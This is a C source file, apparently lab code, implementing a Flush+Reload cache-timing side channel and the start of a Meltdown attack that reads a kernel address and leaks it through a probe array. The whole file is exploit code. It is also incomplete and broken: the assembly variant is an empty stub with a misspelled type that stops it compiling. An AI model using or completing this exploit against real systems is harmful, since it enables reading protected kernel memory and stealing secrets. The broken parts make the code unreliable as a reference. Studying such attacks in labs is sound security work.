#include<stdio.h>
#include<stdint.h>
#include<unistd.h>
#include<string.h>
#include<signal.h>
#include<setjmp.h>
#include<fcntl.h>
#include<emmintrin.h>
#include<x86intrin.h>

// Flush + Reload

uint8_t array[256*4096];
#define CACHE_HIT_THRESOLD (80)
#define DELTA 1024

void flushSideChannel() {
	int i;

	for (i = 0; i < 256; i++) {
		array[i*4096 + DELTA] = 1;
	}

	for (i = 0; i < 256; i++) {
		_mm_clflush(&array[i*4096 + DELTA]);
	}
}

void reloadSideChannel() {
	int junk = 0;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	int i;
	for(i = 0; i < 256; i++) {
		addr = &array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 <= CACHE_HIT_THRESOLD) {
			printf("array[%d*4096 + %d] is in cache\n",i,DELTA);
			printf("The secret = %d\n",i);
		}
	}
}

// Meltdown attack

void meltdown(unsigned long kernel_data_addr) {
	char kernel_data = 0;

	kernel_data = *(char*)kernel_data_addr;
	array[7 * 4096 + DELTA] += 1;
}

void meltdown_asm(unsinged long kernel_data_addr) {

}
